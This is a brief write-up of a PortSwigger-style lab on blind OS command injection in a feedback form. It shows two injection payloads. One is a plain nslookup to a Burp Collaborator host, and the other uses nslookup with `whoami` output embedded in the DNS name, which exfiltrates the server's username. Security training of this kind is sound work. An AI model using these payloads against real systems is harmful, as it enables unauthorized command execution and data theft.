# Blind OS Command Injection — Exfiltrating Data via Out-of-Band Channel

This exercise builds on the previous one, still involving a blind OS command injection in the feedback function.

User-supplied input is again inserted into a server-side shell command, which executes asynchronously and does not influence the HTTP response. Output can't be redirected anywhere accessible either — so data has to be smuggled out through an out-of-band DNS interaction.

**Goal:** Run `whoami` and leak its result by embedding it into a DNS query sent to Burp Collaborator, then submit the recovered username to finish the lab.

Note: Because the Academy's firewall prevents the lab from contacting arbitrary external systems, you must rely on Burp Collaborator's default public server for this to succeed.

---

**Reference:**
- https://portswigger.net/web-security/os-command-injection

<img width="765" height="285" alt="1" src="https://github.com/user-attachments/assets/5793e8a9-5401-4154-b74d-e2df4312b94c" />


---

The feedback form accepts out-of-band interaction through this payload:

```
$(nslookup juh2fcq2cctj3nb1g8ecp69m6dc400op.oastify.com)
```

<img width="715" height="633" alt="2" src="https://github.com/user-attachments/assets/ced87796-3078-408c-8a23-fdeab8765e1f" />


Using the following payload, the username `peter-0B6BNY` was successfully extracted:

```
$(nslookup `whoami`.m1o5mfx5jf0maqi4nblfw9gpdgj774vt.oastify.com)
```

<img width="711" height="629" alt="3" src="https://github.com/user-attachments/assets/e886c7ee-00a3-4e6c-8a84-6b093e78b555" />


<img width="899" height="236" alt="4" src="https://github.com/user-attachments/assets/c6f154eb-e0ee-49e0-a8d6-2f6806d87b02" />

